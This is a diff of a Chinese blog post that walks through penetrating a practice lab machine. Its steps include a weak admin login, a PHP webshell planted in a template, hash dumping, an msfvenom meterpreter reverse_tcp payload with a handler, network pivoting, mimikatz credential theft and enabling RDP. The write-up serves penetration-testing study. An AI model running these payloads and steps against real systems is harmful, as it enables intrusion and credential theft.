@@ -9,15 +9,15 @@
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="nmap扫不到，但是可以ping通&#x3D; &#x3D; 打开主页之后是phpstudy探针，按照官方文档关闭 然后访问，是个目录遍历漏洞&#x3D; &#x3D; 经过配置进入了主页 找到后台发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口 尝试弱密码admin&#x2F;123456可以登陆 后台操作 有个sql执行可以执行某些操作 修改首页模板，index.php可以添加一句话木马， 使用weevely">
+  <meta name="description" content="nmap扫不到，但是可以ping通&#x3D; &#x3D; 打开主页之后是phpstudy探针，按照官方文档关闭 然后访问，是个目录遍历漏洞&#x3D; &#x3D; 经过配置进入了主页 找到后台发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口 尝试弱密码admin&#x2F;123456可以登陆 后台操作 有个sql执行可以执行某些操作  修改首页模板，index.php可以添加一句话木马， 使用weevel">
 <meta property="og:type" content="article">
 <meta property="og:title" content="靶机看答案渗透记录-1">
 <meta property="og:url" content="http://example.com/2020/11/24/note/web/pentist-1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="nmap扫不到，但是可以ping通&#x3D; &#x3D; 打开主页之后是phpstudy探针，按照官方文档关闭 然后访问，是个目录遍历漏洞&#x3D; &#x3D; 经过配置进入了主页 找到后台发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口 尝试弱密码admin&#x2F;123456可以登陆 后台操作 有个sql执行可以执行某些操作 修改首页模板，index.php可以添加一句话木马， 使用weevely">
+<meta property="og:description" content="nmap扫不到，但是可以ping通&#x3D; &#x3D; 打开主页之后是phpstudy探针，按照官方文档关闭 然后访问，是个目录遍历漏洞&#x3D; &#x3D; 经过配置进入了主页 找到后台发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口 尝试弱密码admin&#x2F;123456可以登陆 后台操作 有个sql执行可以执行某些操作  修改首页模板，index.php可以添加一句话木马， 使用weevel">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-11-24T08:42:52.000Z">
-<meta property="article:modified_time" content="2020-11-25T08:43:57.676Z">
+<meta property="article:modified_time" content="2020-12-05T10:23:46.642Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -213,30 +213,54 @@
 <h2 id="找到后台"><a href="#找到后台" class="headerlink" title="找到后台"></a>找到后台</h2><p>发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口</p>
 <p>尝试弱密码admin/123456可以登陆</p>
 <h2 id="后台操作"><a href="#后台操作" class="headerlink" title="后台操作"></a>后台操作</h2><ol>
-<li>有个sql执行可以执行某些操作</li>
-<li>修改首页模板，index.php可以添加一句话木马， 使用weevely访问失败，但是可以使用 <a target="_blank" rel="noopener" href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">AntSword</a> 访问</li>
+<li><p>有个sql执行可以执行某些操作</p>
+</li>
+<li><p>修改首页模板，index.php可以添加一句话木马， 使用weevely访问失败，但是可以使用 <a target="_blank" rel="noopener" href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">AntSword</a> 访问</p>
+</li>
 <li><p>有个gethash的工具可以获取windows上面密码的hash值，但是没下到<br>网上找到一个渗透工具集，好家伙<del>白嫖真爽</del></p>
 <p>pwdump也可以获取hash，获取到了hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">liukaifeng01:1000:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure></li>
-<li>虽然找到了hash值，但是没有找到密码</li>
-<li>开启了3306端口，可以尝试连接，但是连接失败，不允许连接</li>
-<li>使用msf生成木马<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.117 lport=4444 -f exe -o /root/桌面/hakcer.exe</span><br></pre></td></tr></table></figure>
-kali下可以使用msfpc简化<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfpc windows reverse eth1 4444</span><br></pre></td></tr></table></figure></li>
-<li>msf使用exploit/multi/handler模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 4444</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-上传生成的木马到靶机，执行，连接成功，执行sysinfo命令测试是否成功</li>
-<li>run vnc进行桌面监控</li>
-<li>run autoroute -s 192.168.52.1/24<br> 这条命令允许攻击机进入192.168.52.1/24子网</li>
-<li>arp -a查看域控成员</li>
-<li>使用background把当前session保存至后台</li>
-<li>扫描远端IP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li>
-<li>开放了445端口，ms17_010漏洞，大佬说蓝屏，还没试</li>
-<li>ms08_067攻击失败</li>
-<li>再次连接win7，使用load mimikatz获得凭证</li>
-<li>getsystem命令 sysinfo命令 ps命令</li>
-<li>migrate命令，explorer为2872</li>
-<li>之前load了mimikatz(kiwi)插件，然后执行creds_tspkg获取域控密码，新版本msf变了，遇事不决help</li>
-<li>使用run post/windows/manage/enable_rdp开启windows的rdp远程桌面</li>
-<li>linux使用rdesktop连接，windows直接使用远程桌面连接<br>用户名和密码为Administrator/hongrisec@2019</li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">liukaifeng01:1000:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>虽然找到了hash值，但是没有找到密码</p>
+</li>
+<li><p>开启了3306端口，可以尝试连接，但是连接失败，不允许连接</p>
+</li>
+<li><p>使用msf生成木马</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.117 lport=4444 -f exe -o /root/桌面/hakcer.exe</span><br></pre></td></tr></table></figure>
+<p>kali下可以使用msfpc简化</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfpc windows reverse eth1 4444</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>msf使用exploit/multi/handler模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 4444</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>上传生成的木马到靶机，执行，连接成功，执行sysinfo命令测试是否成功</p>
+</li>
+<li><p>run vnc进行桌面监控</p>
+</li>
+<li><p>run autoroute -s 192.168.52.1/24<br> 这条命令允许攻击机进入192.168.52.1/24子网</p>
+</li>
+<li><p>arp -a查看域控成员</p>
+</li>
+<li><p>使用background把当前session保存至后台</p>
+</li>
+<li><p>扫描远端IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开放了445端口，ms17_010漏洞，大佬说蓝屏，还没试</p>
+</li>
+<li><p>ms08_067攻击失败</p>
+</li>
+<li><p>再次连接win7，使用load mimikatz获得凭证</p>
+</li>
+<li><p>getsystem命令 sysinfo命令 ps命令</p>
+</li>
+<li><p>migrate命令，explorer为2872</p>
+</li>
+<li><p>之前load了mimikatz(kiwi)插件，然后执行creds_tspkg获取域控密码，新版本msf变了，遇事不决help</p>
+</li>
+<li><p>使用run post/windows/manage/enable_rdp开启windows的rdp远程桌面</p>
+</li>
+<li><p>linux使用rdesktop连接，windows直接使用远程桌面连接<br>用户名和密码为Administrator/hongrisec@2019</p>
+</li>
 </ol>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
 <li>知道系统相关信息之后可以下载相关源码进行审计发现漏洞。从而找到管理登陆页面，弱密码等</li>
